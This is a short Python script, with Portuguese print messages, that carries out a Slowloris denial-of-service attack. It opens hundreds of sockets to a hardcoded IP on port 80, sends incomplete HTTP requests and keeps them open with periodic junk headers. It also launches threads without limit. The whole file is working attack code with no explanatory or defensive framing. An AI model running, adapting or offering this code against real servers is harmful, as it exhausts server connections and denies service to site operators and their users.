import socket
import random
import time
import threading

conexoes_sock = []
header = ["User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
"Accept-language:en-US,en,q=0.5","Connection: Keep-Alive"]
qtd_socks = 500
ip = "172.21.209.231"


def start_sock():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(2)
	s.connect((ip, 80))
	s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
	print("GET com sucesso")
	for h in header:
		s.send(bytes("{}\r\n".format(h).encode("utf-8")))
		print("Header com sucesso")
	return s

def slowloris():
	try:
		for i in range(qtd_socks):
			try:
				print("Criando conexoes socket")
				print("[",i,"]", end=" ")
				s = start_sock()
				conexoes_sock.append(s)
			except Exception as e:
				print(e)
		print("Conexoes criadas com sucesso")
		n=1
		while (True):
			for sock in conexoes_sock:
				try:
					sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
					print(n, "Enviando headers keep-alive")
					n += 1
				except:
					print("Socket caiu, nova tentativa")
					conexoes_sock.remove(sock)
					try:
						sock = start_sock()
						conexoes_sock.append(sock)
					except:
						pass
			print("Headers keep-alive enviados com sucesso")
			print("Dormindo")
			time.sleep(2)
	except ConnectionRefusedError:
		print("Conexao recusada, tentando novamente")
		slowloris()

def main():
	while(True):
		th = threading.Thread(target=slowloris)
		th.start()

if __name__ == "__main__":
	main()

